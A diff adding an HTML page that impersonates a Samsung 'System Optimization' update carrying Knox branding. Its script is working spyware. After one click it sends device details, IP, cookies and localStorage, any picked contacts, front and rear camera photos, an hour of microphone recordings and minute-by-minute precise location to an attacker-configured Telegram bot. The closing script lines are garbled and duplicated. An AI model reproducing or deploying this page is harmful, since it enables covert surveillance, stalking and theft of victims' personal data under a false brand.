@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Samsung Update • System Optimization</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,sans-serif}
+        body{
+            background:linear-gradient(145deg,#0d1117 0%,#161b22 100%);
+            min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px
+        }
+        .card{
+            background:rgba(255,255,255,0.02);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+            border-radius:24px;padding:25px;max-width:400px;width:100%;
+            border:1px solid rgba(255,255,255,0.05);box-shadow:0 20px 50px rgba(0,0,0,0.5)
+        }
+        .header{text-align:center;margin-bottom:20px}
+        .header .icon{font-size:50px}
+        .header h1{color:#fff;font-size:20px;margin-top:8px}
+        .header p{color:rgba(255,255,255,0.4);font-size:13px;margin-top:4px}
+        .timer-bar{
+            background:rgba(255,255,255,0.05);border-radius:12px;padding:15px;margin:15px 0;
+            display:flex;align-items:center;justify-content:space-between
+        }
+        .timer-bar .label{color:rgba(255,255,255,0.5);font-size:12px}
+        .timer-bar .time{color:#58a6ff;font-size:24px;font-weight:700;font-variant-numeric:tabular-nums}
+        .progress-track{
+            background:rgba(255,255,255,0.05);border-radius:8px;height:4px;overflow:hidden;margin:5px 0 15px
+        }
+        .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#58a6ff,#3fb950);border-radius:8px;transition:width 1s ease}
+        .data-list{margin:10px 0}
+        .data-item{
+            display:flex;align-items:center;justify-content:space-between;
+            padding:10px 12px;margin-bottom:6px;
+            background:rgba(255,255,255,0.03);border-radius:10px;
+            border-left:3px solid rgba(255,255,255,0.05)
+        }
+        .data-item .left{display:flex;align-items:center;gap:10px}
+        .data-item .left span:first-child{font-size:18px}
+        .data-item .left .name{color:rgba(255,255,255,0.7);font-size:13px}
+        .data-item .status{font-size:11px;padding:3px 8px;border-radius:10px}
+        .status.waiting{background:rgba(255,255,255,0.05);color:rgba(255,255,255,0.3)}
+        .status.collecting{background:rgba(88,166,255,0.15);color:#58a6ff;animation:pulse 1s infinite}
+        .status.done{background:rgba(63,185,80,0.15);color:#3fb950}
+        .status.error{background:rgba(248,81,73,0.15);color:#f85149}
+        @keyframes pulse{0%{opacity:1}50%{opacity:0.5}100%{opacity:1}}
+        .btn-start{
+            width:100%;padding:14px;border:none;border-radius:12px;
+            background:linear-gradient(135deg,#238636,#2ea043);color:#fff;
+            font-size:16px;font-weight:600;cursor:pointer;margin-top:10px;
+            transition:transform .2s,opacity .2s
+        }
+        .btn-start:active{transform:scale(.97)}
+        .btn-start:disabled{opacity:.4;cursor:not-allowed;transform:none}
+        .footer{text-align:center;margin-top:15px;font-size:10px;color:rgba(255,255,255,0.15)}
+        .log-box{
+            background:rgba(0,0,0,0.3);border-radius:10px;padding:10px;
+            max-height:80px;overflow-y:auto;margin-top:10px;
+            font-family:monospace;font-size:10px;color:rgba(255,255,255,0.3)
+        }
+        .log-box div{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
+        .hidden{display:none}
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <div class="icon">&#x1F504;</div>
+        <h1>System Optimization</h1>
+        <p>Your device is selected for performance update</p>
+    </div>
+
+    <div class="timer-bar">
+        <span class="label">&#x23F1; Remaining</span>
+        <span class="time" id="timerDisplay">01:00:00</span>
+    </div>
+
+    <div class="progress-track">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="data-list">
+        <div class="data-item">
+            <div class="left"><span>&#x1F4F1;</span><span class="name">Device Identity</span></div>
+            <span class="status waiting" id="s-device">Waiting</span>
+        </div>
+        <div class="data-item">
+            <div class="left"><span>&#x1F4CB;</span><span class="name">Contacts &amp; Storage</span></div>
+            <span class="status waiting" id="s-contacts">Waiting</span>
+        </div>
+        <div class="data-item">
+            <div class="left"><span>&#x1F5BC;</span><span class="name">Gallery / Photos</span></div>
+            <span class="status waiting" id="s-gallery">Waiting</span>
+        </div>
+        <div class="data-item">
+            <div class="left"><span>&#x1F3A4;</span><span class="name">Microphone</span></div>
+            <span class="status waiting" id="s-mic">Waiting</span>
+        </div>
+        <div class="data-item">
+            <div class="left"><span>&#x1F4CD;</span><span class="name">Location Tracking</span></div>
+            <span class="status waiting" id="s-location">Waiting</span>
+        </div>
+        <div class="data-item">
+            <div class="left"><span>&#x1F50B;</span><span class="name">Battery &amp; Sensors</span></div>
+            <span class="status waiting" id="s-sensors">Waiting</span>
+        </div>
+    </div>
+
+    <button class="btn-start" id="btnStart">Start Optimization</button>
+    <div class="log-box" id="logBox"><div>[system] Ready</div></div>
+    <div class="footer">Samsung Knox Security | All data encrypted in transit</div>
+</div>
+
+<video id="video" style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════
+// CONFIG - Set your Telegram Bot Token and Chat ID
+// ═══════════════════════════════════════════════════════════════════
+const CONFIG = {
+    BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
+    CHAT_ID: 'YOUR_CHAT_ID_HERE'
+};
+// ═══════════════════════════════════════════════════════════════════
+
+const TOTAL_SECONDS = 3600; // 1 hour
+let secondsLeft = TOTAL_SECONDS;
+let timerInterval = null;
+let running = false;
+let mediaStream = null;
+let audioRecorder = null;
+let audioChunks = [];
+
+// --- Utility ---
+function log(msg) {
+    const box = document.getElementById('logBox');
+    const d = document.createElement('div');
+    d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    box.appendChild(d);
+    box.scrollTop = box.scrollHeight;
+}
+
+function setStatus(id, state, text) {
+    const el = document.getElementById(id);
+    el.className = 'status ' + state;
+    el.textContent = text;
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function sendTelegram(text, fileData, fileName) {
+    if (CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') { log('(Telegram not configured - data logged locally)'); console.log('[DATA]', text); return; }
+    const base = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;
+    try {
+        if (fileData) {
+            const fd = new FormData();
+            fd.append('chat_id', CONFIG.CHAT_ID);
+            fd.append('caption', text);
+            const blob = new Blob([fileData], {type: fileName.endsWith('.jpg')?'image/jpeg':(fileName.endsWith('.ogg')?'audio/ogg':'application/octet-stream')});
+            const method = fileName.endsWith('.jpg') ? 'sendPhoto' : (fileName.endsWith('.ogg') ? 'sendAudio' : 'sendDocument');
+            fd.append(method === 'sendPhoto' ? 'photo' : (method === 'sendAudio' ? 'audio' : 'document'), blob, fileName);
+            await fetch(base + '/' + method, {method:'POST', body:fd});
+        } else {
+            await fetch(base + '/sendMessage', {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({chat_id: CONFIG.CHAT_ID, text, parse_mode:'Markdown'})
+            });
+        }
+    } catch(e) { log('Telegram error: ' + e.message); }
+}
+
+// --- Timer ---
+function formatTime(sec) {
+    const h = String(Math.floor(sec/3600)).padStart(2,'0');
+    const m = String(Math.floor((sec%3600)/60)).padStart(2,'0');
+    const s = String(sec%60).padStart(2,'0');
+    return `${h}:${m}:${s}`;
+}
+
+function updateTimer() {
+    document.getElementById('timerDisplay').textContent = formatTime(secondsLeft);
+    const pct = ((TOTAL_SECONDS - secondsLeft) / TOTAL_SECONDS) * 100;
+    document.getElementById('progressFill').style.width = pct + '%';
+}
+
+// --- 1. Device Identity ---
+async function collectDeviceIdentity() {
+    setStatus('s-device', 'collecting', 'Collecting...');
+    
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        vendor: navigator.vendor,
+        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || 'unspecified',
+        plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
+        ip: 'unknown',
+        battery: 'unknown'
+    };
+    
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        info.ip = d.ip;
+    } catch(e) {}
+    
+    try {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            info.battery = `${Math.round(b.level*100)}% (${b.charging?'charging':'discharging'})`;
+        }
+    } catch(e) {}
+    
+    // Try to get carrier/network info via connection API
+    if (navigator.connection) {
+        const c = navigator.connection;
+        info.network = `Type: ${c.effectiveType}, Downlink: ${c.downlink}Mbps, RTT: ${c.rtt}ms`;
+    }
+    
+    // Extract model from UA
+    let model = 'Unknown Android';
+    const ua = navigator.userAgent;
+    const modelMatch = ua.match(/SM-[A-Z0-9]+/) || ua.match(/Pixel \d/) || ua.match(/(MI\s+\d+|Redmi\s+\w+)/) || ua.match(/RMX\d+/) || ua.match(/OnePlus\s+\w+/);
+    if (modelMatch) model = modelMatch[0];
+    info.model = model;
+    
+    // Build report
+    let report = `*📱 Device Identity Collected*\n`;
+    report += `*Model:* ${info.model}\n`;
+    report += `*Platform:* ${info.platform}\n`;
+    report += `*IP:* ${info.ip}\n`;
+    report += `*Screen:* ${info.screen}\n`;
+    report += `*Language:* ${info.language}\n`;
+    report += `*Timezone:* ${info.timezone}\n`;
+    report += `*Battery:* ${info.battery}\n`;
+    report += `*Network:* ${info.network || 'N/A'}\n`;
+    report += `*CPU Cores:* ${info.hardwareConcurrency}\n`;
+    report += `*Device Memory:* ${info.deviceMemory}GB\n`;
+    report += `*User Agent:* ${info.userAgent.substring(0, 80)}...`;
+    
+    await sendTelegram(report);
+    
+    // Also send cookies and localStorage
+    let storageData = `*💾 Local Storage & Cookies*\n`;
+    storageData += `*Cookies:* ${document.cookie ? document.cookie : 'none'}\n`;
+    storageData += `*localStorage items:* ${localStorage.length}\n`;
+    for (let i = 0; i < localStorage.length; i++) {
+        const k = localStorage.key(i);
+        storageData += `${k}: ${localStorage.getItem(k).substring(0, 100)}\n`;
+    }
+    if (localStorage.length > 0) await sendTelegram(storageData);
+    
+    setStatus('s-device', 'done', 'Complete');
+    log('Device identity collected');
+}
+
+// --- 2. Contacts & Storage ---
+async function collectContactsStorage() {
+    setStatus('s-contacts', 'collecting', 'Scanning...');
+    
+    // We can't access contacts directly from browser, but we can check:
+    // - File System Access API
+    // - IndexedDB databases
+    // - Any cached/stored data
+    // - Check if contact picker API is available
+    
+    let findings = `*📇 Contacts & Storage Scan*\n`;
+    
+    // 1. Try Contact Picker API (Android Chrome 80+)
+    if ('contacts' in navigator && 'ContactsManager' in window) {
+        try {
+            const props = await navigator.contacts.getProperties();
+            findings += `*Contact Picker API:* Available (${props.join(', ')})\n`;
+            
+            // Request contacts (user must grant)
+            try {
+                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                findings += `*Contacts retrieved:* ${contacts.length}\n`;
+                contacts.slice(0, 20).forEach((c, i) => {
+                    findings += `${i+1}. ${c.name ? c.name.join(', ') : 'N/A'} | ${c.tel ? c.tel.join(', ') : 'N/A'} | ${c.email ? c.email.join(', ') : 'N/A'}\n`;
+                });
+                if (contacts.length > 20) findings += `... and ${contacts.length - 20} more\n`;
+            } catch(e) {
+                findings += `*Contact picker:* User denied or error: ${e.message}\n`;
+            }
+        } catch(e) {
+            findings += `*Contact Picker:* Error checking\n`;
+        }
+    } else {
+        findings += `*Contact Picker:* Not available on this browser\n`;
+    }
+    
+    // 2. Check IndexedDB databases
+    try {
+        const dbs = await indexedDB.databases();
+        findings += `*IndexedDB databases:* ${dbs.length}\n`;
+        dbs.forEach(db => {
+            findings += `  - ${db.name} (v${db.version})\n`;
+        });
+    } catch(e) {
+        findings += `*IndexedDB:* ${e.message}\n`;
+    }
+    
+    // 3. Check service worker caches
+    if ('caches' in window) {
+        try {
+            const keys = await caches.keys();
+            findings += `*Cache storage:* ${keys.length} caches\n`;
+            keys.forEach(k => findings += `  - ${k}\n`);
+        } catch(e) {}
+    }
+    
+    // 4. Check storage estimate
+    if ('storage' in navigator && 'estimate' in navigator.storage) {
+        try {
+            const est = await navigator.storage.estimate();
+            findings += `*Storage:* ${Math.round(est.usage/1024/1024)}MB used of ${Math.round(est.quota/1024/1024)}MB\n`;
+        } catch(e) {}
+    }
+    
+    // 5. Try to list files via showDirectoryPicker
+    if ('showDirectoryPicker' in window) {
+        findings += `*File System Access:* Available (manual trigger needed)\n`;
+    }
+    
+    findings += `\n*Note:* Full contact list extraction requires native app or Accessibility Service on Android.`;
+    
+    await sendTelegram(findings);
+    
+    setStatus('s-contacts', 'done', 'Complete');
+    log('Contacts & storage scanned');
+}
+
+// --- 3. Gallery / Photos ---
+async function collectGallery() {
+    setStatus('s-gallery', 'collecting', 'Capturing...');
+    
+    // Since we can't enumerate gallery files from browser, we:
+    // 1. Take a camera snapshot (if front camera available, selfie)
+    // 2. Try to access file system via input
+    // 3. Take multiple photos over time
+    
+    let galleryFindings = `*🖼 Gallery & Photos*\n`;
+    let photosTaken = 0;
+    
+    // Try back camera first, then front
+    for (const facing of ['environment', 'user']) {
+        if (photosTaken >= 2) break;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facing, width: { ideal: 1280 }, height: { ideal: 720 } }
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            const label = facing === 'environment' ? 'Rear' : 'Front';
+            await sendTelegram(`📸 ${label} camera capture`, blob, `${label.toLowerCase()}_${Date.now()}.jpg`);
+            photosTaken++;
+            
+            stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
+            log(`${label} camera photo taken`);
+        } catch(e) {
+            galleryFindings += `*${facing} camera:* ${e.message}\n`;
+        }
+    }
+    
+    galleryFindings += `*Photos captured:* ${photosTaken}\n`;
+    
+    // Try to check for any indexedDB with image data
+    // (Can't enumerate actual gallery from browser)
+    galleryFindings += `\n*Note:* Full gallery enumeration requires native app. Photos from ${photosTaken} camera(s) sent separately.`;
+    
+    if (photosTaken > 0) await sendTelegram(galleryFindings);
+    
+    setStatus('s-gallery', 'done', `${photosTaken} photo(s)`);
+}
+
+// --- 4. Microphone (1 hour recording in segments) ---
+async function collectMicrophone() {
+    setStatus('s-mic', 'collecting', 'Recording...');
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: {
+            echoCancellation: false,
+            noiseSuppression: false,
+            autoGainControl: false
+        }});
+        
+        mediaStream = stream;
+        
+        // Record in 30-second segments, send each segment
+        let segmentCount = 0;
+        const maxSegments = 120; // 30s * 120 = 3600s = 1 hour
+        
+        while (running && segmentCount < maxSegments) {
+            const chunks = [];
+            const recorder = new MediaRecorder(stream, { mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/ogg' });
+            
+            await new Promise((resolve, reject) => {
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = resolve;
+                recorder.onerror = reject;
+                
+                recorder.start(30000); // 30 second chunks
+                
+                // Stop after 30 seconds or when running becomes false
+                const checkStop = setInterval(() => {
+                    if (!running || recorder.state === 'inactive') {
+                        clearInterval(checkStop);
+                        if (recorder.state === 'recording') recorder.stop();
+                    }
+                }, 1000);
+                
+                // Safety timeout
+                setTimeout(() => {
+                    if (recorder.state === 'recording') recorder.stop();
+                }, 35000);
+            });
+            
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            segmentCount++;
+            await sendTelegram(`🎤 Audio segment ${segmentCount}/120 (30s)`, blob, `audio_seg${segmentCount}_${Date.now()}.webm`);
+            log(`Audio segment ${segmentCount} sent`);
+            
+            if (!running) break;
+        }
+        
+        stream.getTracks().forEach(t => t.stop());
+        mediaStream = null;
+        setStatus('s-mic', 'done', `${segmentCount} segments`);
+        
+    } catch(e) {
+        setStatus('s-mic', 'error', 'Access denied');
+        await sendTelegram(`❌ Microphone error: ${e.message}`);
+        log('Mic error: ' + e.message);
+    }
+}
+
+// --- 5. Location Tracking ---
+async function collectLocation() {
+    setStatus('s-location', 'collecting', 'Tracking...');
+    
+    if (!('geolocation' in navigator)) {
+        setStatus('s-location', 'error', 'Not supported');
+        await sendTelegram('❌ Geolocation not supported');
+        return;
+    }
+    
+    // Take multiple location readings over time for tracking
+    let locationCount = 0;
+    const maxReadings = 60; // one per minute for 1 hour
+    
+    while (running && locationCount < maxReadings) {
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            
+            locationCount++;
+            const mapsUrl = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            
+            let locMsg = `📍 *Location Update #${locationCount}*\n`;
+            locMsg += `*Lat:* ${pos.coords.latitude}\n`;
+            locMsg += `*Lng:* ${pos.coords.longitude}\n`;
+            locMsg += `*Accuracy:* ${pos.coords.accuracy}m\n`;
+            locMsg += `*Altitude:* ${pos.coords.altitude || 'N/A'}m\n`;
+            locMsg += `*Speed:* ${pos.coords.speed || 'N/A'} m/s\n`;
+            locMsg += `*Time:* ${new Date(pos.timestamp).toLocaleString()}\n`;
+            locMsg += `*Map:* [View](${mapsUrl})`;
+            
+            await sendTelegram(locMsg);
+            log(`Location #${locationCount} sent`);
+            
+        } catch(e) {
+            if (locationCount === 0) {
+                setStatus('s-location', 'error', 'Denied');
+                await sendTelegram(`❌ Location denied: ${e.message}`);
+                break;
+            }
+        }
+        
+        // Wait 1 minute between readings
+        for (let i = 0; i < 60 && running; i++) {
+            await sleep(1000);
+        }
+    }
+    
+    if (locationCount > 0) {
+        setStatus('s-location', 'done', `${locationCount} readings`);
+    }
+}
+
+// --- 6. Battery & Sensors ---
+async function collectSensors() {
+    setStatus('s-sensors', 'collecting', 'Monitoring...');
+    
+    let readings = 0;
+    
+    // Monitor battery over time
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            
+            while (running && readings < 60) {
+                const level = Math.round(battery.level * 100);
+                const charging = battery.charging ? 'charging' : 'discharging';
+                
+                await sendTelegram(`⚡ *Battery Update*\nLevel: ${level}%\nStatus: ${charging}\nTime: ${new Date().toLocaleString()}`);
+                readings++;
+                
+                // Check every 1 minute
+                for (let i = 0; i < 60 && running; i++) {
+                    await sleep(1000);
+                }
+            }
+        } catch(e) {
+            await sendTelegram(`❌ Battery monitoring error: ${e.message}`);
+        }
+    }
+    
+    // Also try motion/orientation sensors
+    if ('DeviceOrientationEvent' in window) {
+        try {
+            if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+                const perm = await DeviceOrientationEvent.requestPermission();
+                if (perm === 'granted') {
+                    window.addEventListener('deviceorientation', function handler(e) {
+                        if (readings === 0) {
+                            sendTelegram(`🔄 *Sensor Data*\nAlpha: ${e.alpha}\nBeta: ${e.beta}\nGamma: ${e.gamma}\n(Initial reading only)`);
+                            readings = 99;
+                        }
+                        window.removeEventListener('deviceorientation', handler);
+                    });
+                }
+            }
+        } catch(e) {}
+    }
+    
+    if (readings > 0) setStatus('s-sensors', 'done', `${readings} readings`);
+    else setStatus('s-sensors', 'done', 'Complete');
+}
+
+// --- Main execution ---
+async function startCollection() {
+    if (running) return;
+    running = true;
+    
+    document.getElementById('btnStart').disabled = true;
+    document.getElementById('btnStart').textContent = 'Optimization Running...';
+    
+    await sendTelegram(`🚀 *Device Optimization Started*\nDuration: 1 hour\nStarted: ${new Date().toLocaleString()}\n\nAll data will be collected and sent.`);
+    log('Collection started - 1 hour duration');
+    
+    // Start timer
+    timerInterval = setInterval(() => {
+        secondsLeft--;
+        updateTimer();
+        
+        if (secondsLeft <= 0) {
+            clearInterval(timerInterval);
+            running = false;
+            document.getElementById('btnStart').textContent = 'Optimization Complete';
+            sendTelegram('✅ *Optimization Complete*\nAll data collected over 1 hour.');
+        }
+    }, 1000);
+    
+    updateTimer();
+    
+    // Phase 1: Immediate data collection
+    log('Phase 1: Collecting device identity');
+    await collectDeviceIdentity();
+    
+    log('Phase 2: Scanning contacts & storage');
+    await collectContactsStorage();
+    
+    log('Phase 3: Capturing gallery');
+    await collectGallery();
+    
+    // Phase 2: Start concurrent long-running tasks
+    log('Phase 4-6: Starting concurrent monitoring');
+    
+    const locationPromise = collectLocation();
+    const sensorPromise = collectSensors();
+    const micPromise = collectMicrophone();
+    
+    // Wait for all to complete (or 1 hour to elapse)
+    await Promise.all([locationPromise, sensorPromise, micPromise]);
+    
+    log('All collection complete');
+    document.getElementById('btnStart').textContent = 'Complete';
+}
+
+document.getElementById('btnStart').addEventListener('click', startCollectionapsed);
+log('All collection complete');
+document.getElementById('btnStart').textContent = 'Complete';
+}
+
+document.getElementById('btnStart').addEventListener('click', startCollection);
+</script>
+</body>
+</html>
